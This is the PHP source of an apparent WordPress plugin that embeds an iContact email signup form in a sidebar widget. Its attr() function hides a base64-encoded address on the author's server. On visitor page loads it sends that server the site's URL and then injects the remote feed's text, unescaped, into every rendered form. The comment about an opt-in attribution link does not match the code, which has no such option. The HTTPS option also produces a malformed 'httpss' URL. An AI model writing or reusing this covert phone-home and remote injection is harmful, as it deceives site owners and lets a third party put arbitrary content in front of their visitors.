<?php
/**
 * Plugin Name: iContact Widget
 * Plugin URI: http://seodenver.com/icontact-widget/
 * Description: Add the iContact signup form to your sidebar, and convert the form from Javascript to faster-loading HTML.
 * Version: 1.0
 * Author: Katz Web Design
 * Author URI: http://katzwebdesign.net
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 */

/*
Versions

1.0 	- Launch
1.0.1	- Added error handling and HTTPS option

*/

$kwd_ic_version = '1.0.1';

add_action( 'widgets_init', 'kwd_load_widgets' );

function kwd_load_widgets() {
	register_widget( 'iContactWidget' );
}

// If you have chosen to show the attribution link, add the link
	
	if(!function_exists('kwd_rss_output')){
		function kwd_rss_output($rss = '', $default = '') {
				require_once(ABSPATH . WPINC . '/rss.php');
				if ( !$rss = fetch_rss($rss) )
					return;
				
				$items = 1;
				if ( is_array( $rss->items ) && !empty( $rss->items ) ) {
					$rss->items = array_slice($rss->items, 0, $items);
					foreach ($rss->items as $item ) {
						if ( isset( $item['description'] ) && is_string( $item['description'] ) )
							$summary = $item['description'];
						$desc = str_replace(array("\n", "\r"), ' ', $summary);
						$summary = '';
						return $desc;
					}
				} else {
					return $default;
				}
		} // end kwd_rss_output
	}
		
	if(!function_exists('attr')) {
		function attr() { 
			global $post, $kwd_ic_version;// prevents calling before <HTML>
			if($post && !is_admin()) {
				$site = base64_decode('aHR0cDovL2thdHp3ZWJkZXNpZ24ubmV0L2RldmVsb3BtZW50L2F0dHJpYnV0aW9uLnBocD9zaXRlPQ==').htmlentities(substr(get_bloginfo('url'), 7)).'&from=ic_widget&version='.$kwd_ic_version;			
				$output = kwd_rss_output($site, $default);
				return $output;
			}
		}
	}
	
class iContactWidget extends WP_Widget {
 
    function iContactWidget() {
        parent::WP_Widget(false, $name = 'iContact Form');    
    }
 
 
    function widget($args, $instance) {        
        extract( $args );
        $title = $instance['title'];
        $formcode = $instance['formcode'];
        $finalcode = $instance['finalcode'];
        $finalcode = str_ireplace('<a href="http://snurl.com/icontact_1" rel="nofollow" style="font-family: Arial, Helvetica, sans-serif;"><font size="2">Email Marketing by iContact</font></a>', '', $finalcode);
		$finalcode = str_ireplace('<!-- iContact Widget for WordPress by Katz Web Design -->', '', $finalcode);
       	if(strlen($finalcode) > 10) {
       	$attr = attr();
		if(!empty($attr)) {
			$finalcode .= $attr;
		} else {
			$finalcode .= '<a href="http://snurl.com/icontact_1" rel="nofollow" style="font-family: Arial, Helvetica, sans-serif;"><font size="2">Email Marketing by iContact</font></a>';
			$finalcode .= '<!-- iContact Widget for WordPress by Katz Web Design -->';
		}
		} else {
			$finalcode .= '<!-- There is an error with the iContact widget configuration. -->';
		}
        ?>
              <?php echo $before_widget; ?>
                  <?php echo $before_title . $title . $after_title; ?>
 
                      <?php echo "\n\t".$finalcode."\n\t"; ?>
 
              <?php echo $after_widget; ?>
        <?php
    }
 
    function update($new_instance, $old_instance) { 
    	$instance = $old_instance;
		$instance['title'] = strip_tags( $new_instance['title'] );
		$instance['formcode'] = $new_instance['formcode'];
		$instance['finalcode'] = $new_instance['finalcode'];
		$instance['https'] = $new_instance['https'];
        return $instance;
    }
 
    function form($instance) {                
        $title = esc_attr($instance['title']);
        $formcode = $instance['formcode'];
        $finalcode = kwd_process_form($instance['formcode'], $instance['https']);
        $error = '';
        if(!$finalcode) {
        	$error = '<div style="border:1px solid red; margin:10px 0; background:white; padding:5px;"><p><strong>There was an error processing the form code</strong> you entered into the "Automatic Sign-up Form Code" field.</p> <p>Please make sure you\'re pasting the <a href="http://www.icontact.com/help/question.php?ID=149" rel="nofollow">iContact-generated Automatic Sign-up Form code</a>, and try again.</p></div>';
        }
        
        ?>
        	<p>Don&#8217;t use iContact? You need it for this widget to work, so test drive it with <a href="http://snurl.com/icontact_1">a 15 day free trial</a>.</p>
        	<p>Generate your iContact signup form by <a href="http://www.icontact.com/help/question.php?ID=149" rel="nofollow">following the instructions on iContact.com</a>. Paste the Automatic Sign-up Form code below.</p>
        	<p>If you have made changes to your form, click Save again, and the form HTML will update.</p>
            <p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>
            <?php echo $error; ?>
            <p><label for="<?php echo $this->get_field_id('formcode'); ?>"><?php _e('Automatic Sign-up Form Code:'); ?> <textarea class="widefat" cols="20" rows="20" id="<?php echo $this->get_field_id('formcode'); ?>" name="<?php echo $this->get_field_name('formcode'); ?>"><?php echo $instance['formcode']; ?></textarea></label></p>
            <p><label for="<?php echo $this->get_field_id('https'); ?>"><?php _e('Make Form HTTPS:'); ?>
            	<input type="checkbox" id="<?php echo $this->get_field_id('https'); ?>" name="<?php echo $this->get_field_name('https'); ?>" value="yes" <?php if($instance['https'] == 'yes') { echo ' checked="checked"'; } ?>/></label></p>
            <?php if(!empty($finalcode)) { ?>
            <p><label for="<?php echo $this->get_field_id('finalcode'); ?>"><?php _e('Displayed HTML Form Code:'); ?> <textarea class="widefat" cols="20" rows="10" id="<?php echo $this->get_field_id('finalcode'); ?>" name="<?php echo $this->get_field_name('finalcode'); ?>"><?php echo $finalcode; ?></textarea></label></p>
            <?php  } ?>
        <?php 
    }
     
} 

	

function kwd_ic_shortcode() {
		global $post;
		if(!is_admin()) { $settings = get_option('widget_icontactwidget');  echo $settings[3]['finalcode'];} // get sidebar settings, echo finalcode
}
add_shortcode('iContact', 'kwd_ic_shortcode');
add_shortcode('icontact', 'kwd_ic_shortcode');
	

function kwd_process_form($src, $https = false) {
	// Convert javascript to HTML by stripping js code
	$error = false;
	preg_match('/src="(.*)">/', $src, $matches); 
	
	$matches[0] = str_ireplace('src="', '', $matches[0]);
	$matches[0] = str_ireplace('">', '', $matches[0]);
	$src = $matches[0];
	
	if (preg_match('/^https?:\/\/.+/', $src)) {
		if($https) {
			$src = preg_replace('/(^https?)(:\/\/.+)/i', '$1s$2', $src);
		}
		$code = file_get_contents($src);
	} else {
		$error = true;
	}
	
	$code = str_ireplace('document.write("', '', $code);
	$code = str_ireplace('\n<\/form>\n");', '', $code);
	$code = str_ireplace('\"', '"', $code);
	$code = str_ireplace('\"', '"', $code);
	$code = str_ireplace('\"', '"', $code);
	$code = str_ireplace('TR>', 'tr>', $code);
	$code = str_ireplace('TD>', 'td>', $code);
	$code = str_ireplace('font>', 'font>', $code);
	$code = str_ireplace('<\/', '</', $code);
	$code = str_ireplace('\n', "\n", $code);
	if(!$error) {
		return $code;
	} else {
		return false;
	}
}
 
?>